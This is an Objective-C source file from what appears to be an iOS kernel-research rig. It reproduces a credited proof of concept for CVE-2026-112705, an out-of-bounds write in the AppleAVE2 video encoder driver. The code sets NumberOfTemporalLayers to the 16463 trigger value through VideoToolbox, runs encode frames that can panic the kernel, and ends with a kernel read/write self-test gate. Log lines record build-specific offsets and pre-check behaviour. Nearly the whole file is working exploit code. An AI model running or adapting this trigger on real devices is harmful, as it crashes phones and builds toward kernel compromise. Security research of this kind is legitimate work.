//
//  P142AVETemporal.m — the AVE2 TEMPORAL-LAYERS KNOB (CVE-2026-112705). p142.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Vector credit: MMdAS (repo MchinaMd57764/AVETemporalPoC-CVE-2026-112705),
//  original discovery credited to the Calif/Chollima team. Session laws
//  copied from AVEVTSmoke (the pack's own VT law: create → prepare → one
//  encode → complete → invalidate). The knob = NumberOfTemporalLayers via
//  VTSessionSetProperty with the plain-string key (the PoC's property).
//
//  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill);
//  panic = the count-law receipt, BY DESIGN; one value per tap;
//  hasKread stays kread32-gated; tokens/logs never leave the device.
//

#import "P142AVETemporal.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P142_BUILD   @"p142-avetemporal-v5-honesty"
#define P142_KEY     @"NumberOfTemporalLayers"
#define P142_DEFAULT 16463         /* the PoC's trigger threshold */
#define P142_SURVIVE 16462         /* the PoC's surviving value */

static void p142_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P142R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p142_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p142", arms, 1, &sr, 0, "p142 avetemporal auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p142", 0, outcome);
}

@implementation P142AVETemporal

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p142_avetemporal_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p142 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P142_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[vector credit] CVE-2026-112705 borrowed: MMdAS PoC (A V E 2 kernel");
    L(@"  OOB write via NumberOfTemporalLayers=16463; 16462 survives; 27.2");
    L(@"  added the -12900 pre-check). The lab's fill-store conversion class");
    L(@"  (the p088/p112 geometry) with a LIVE count knob.");
    L(@"[!] PANIC-POSSIBLE BY DESIGN = the count-law receipt; ONE encode");
    L(@"  per tap; knob = Documents/p142_layers.txt (decimal).");
    L(@"  blank = 16463 PoC row. 0 = 16462 survival. 16463 = panic row.");
    L(@"  1..16461 cannot hit the OOB (09:06 live: layers=18 readback=1).");
    L(@"  T8150 24A435: rc=-12900 is VT RCMode=20 miss, NOT the 27.2 NTL");
    L(@"  kernel pre-check. Nov 1 panics (5x, videocodecd, AppleAVE2");
    L(@"  913.43.1 +0xDA78 far=0x59) fired with that same rc=-12900.");
    L(@"  readback=1 on T8150 = VT store law; the internal count still");
    L(@"  reaches AVE2. Hunt 12 23F77 never panics = different AVE2.");

    /* the knob — 0 is the survival control (code used to ignore it). */
    long layers = P142_DEFAULT;
    NSString *knob = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:@"p142_layers.txt"]
        encoding:NSUTF8StringEncoding error:nil];
    if (knob) {
        long v = strtol(knob.UTF8String, NULL, 10);
        if (v == 0) layers = P142_SURVIVE;
        else if (v > 0) layers = v;
        Lf(@"[*] knob file present: parsed=%ld layers=%ld%@",
           v, layers, (v == 0) ? @" (0 → 16462 survival)" : @"");
    } else {
        Lf(@"[*] no knob file: layers=%ld (the PoC row)", layers);
    }
    if (layers > 0 && layers < P142_SURVIVE) {
        Lf(@"[HOLD] layers=%ld < 16462 — this count cannot hit the 16463 OOB.",
           layers);
        L(@"  Delete Documents/p142_layers.txt (or write 16463) for the panic");
        L(@"  row; write 0 for the 16462 survival control. Encode still runs");
        L(@"  so the receipt is visible.");
    }

    id<NSObject> nothing = nil; (void)nothing;   /* clang tidy */

    /* ---- the session (AVEVTSmoke law) ---- */
    /* v4 = the PoC's stage9 law VERBATIM: EncoderUsage=1, RCMode=20,
       RealTime=FALSE, the bare count — the RAW path that skips the
       layer-feature pipeline's clamp-to-1 (v2's clamped row = the class
       difference both trains showed). 4 frames max, break on error. */
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, p142_flushCB, (__bridge void *)docs, &session);
    if (st != noErr || !session) {
        Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        p142_bandit("nocreate"); return P142R();
    }
    L(@"[1] session created (HEVC 1280x720, the stage9 mode)");

    OSStatus sUsage = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"EncoderUsage",
        (__bridge CFTypeRef)@1);
    OSStatus sRC = VTSessionSetProperty(session,
        (__bridge CFStringRef)@"RCMode",
        (__bridge CFTypeRef)@20);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanFalse);
    CFStringRef key = (__bridge CFStringRef)P142_KEY;
    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
                                     kCFNumberSInt32Type, &(int32_t){ (int32_t)layers });
    st = VTSessionSetProperty(session, key, val);
    CFRelease(val);
    Lf(@"[2] usage st=%d rc st=%d SetProperty(NumberOfTemporalLayers=%ld)"
       @" st=%d", (int)sUsage, (int)sRC, layers, (int)st);
    if (sRC == -12900) {
        L(@"[law] rc st=-12900 = VT RCMode=20 property miss on this build.");
        L(@"  27.2 kernel pre-check returns -12900 on NumberOfTemporalLayers");
        L(@"  itself (ntl st). ntl st=0 here = 27.0 still accepts the count.");
        L(@"  Nov 1 T8150 panics used this same rc=-12900 + N=16463.");
    }
    if ((int)st == -12900) {
        L(@"[law] ntl st=-12900 = 27.2-class kernel pre-check (this SKU");
        L(@"  should not show that on 24A435).");
    }

    /* the readback: the stage9 row */
    {
        void *rb = NULL;
        OSStatus rst = VTSessionCopyProperty(session, key,
                                             kCFAllocatorDefault, &rb);
        if (rst == 0 && rb) {
            int32_t rv = 0; CFNumberGetValue((CFNumberRef)rb,
                                             kCFNumberSInt32Type, &rv);
            Lf(@"[2c] readback = %d (16463 = VT stored the raw count;"
               @" 1 = VT store clamp; 0 = dropped)", rv);
            if (rv == 1 && layers > 1) {
                L(@"[law] readback=1 is VT's store. T8150 24A435 still delivers");
                L(@"  the internal count to AppleAVE2 (Nov 1: 5 panics at");
                L(@"  +0xDA78 far=0x59 with readback-class clamp). Hunt 12");
                L(@"  23F77 stays at readback=1 with no panic = other kext.");
            }
            CFRelease(rb);
        } else {
            Lf(@"[2c] readback st=%d", (int)rst);
        }
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[3] Prepare st=%d", (int)st);

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        p142_bandit("nopb"); return P142R();
    }

    OSStatus firstSt = 0;
    for (int i = 0; i < 4; i++) {
        VTEncodeInfoFlags flags = 0;
        OSStatus est = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, &flags);
        if (i == 0) firstSt = est;
        if (i == 0) L(@"[4] ENCODE[0] = the PoC's panic point (IN FLIGHT)");
        if (est != 0) break;
    }
    Lf(@"[4] battery returned; first st=%d (a clean return + a nonzero"
       @" readback = the RAW count law landed)", (int)firstSt);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[5] session invalidated (a clean return = survived this count)");

    /* the honest KRW self-test tail (survival only; never a read claim).
       v3 gate law: the board-first route — the app-sandbox wall zeroes the
       libkrw glue's kbase() (tonight's mini law), so the gate checks the
       BOARD's committed slide + its registered kread32Fn, and falls back
       to the lane API. */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    {
        P007Board *brd = [P007Board shared];
        uint64_t kb = brd.kbase ? brd.kbase : P007LaneKbase();
        P007Kread32Fn rfn = [brd kread32Fn];
        BOOL pass = NO;
        if (kb && rfn) {
            BOOL okNo = NO;
            pass = (rfn(kb, &okNo) == 0xfeedfacfULL) && okNo;
        } else if (kb && P007LaneLive()) {
            pass = (P007LaneKRead32(kb) == 0xfeedfacfULL);
        }
        if (pass) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)",
               (unsigned long long)kb);
            p142_bandit("selftest-read-pass");
        } else {
            Lf(@"  KRW SELF-TEST READ: FAIL/HOLD (board-kbase=%lld lane-kbase=%@)",
               (long long)brd.kbase,
               kb ? [NSString stringWithFormat:@"%#llx",
                     (unsigned long long)kb] : @"0");
            p142_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [brd kreadSignal]);
    }
    Lf(@"=== p142 end %@ ===", LabLocalMilitaryNow());
    return P142R();
}

@end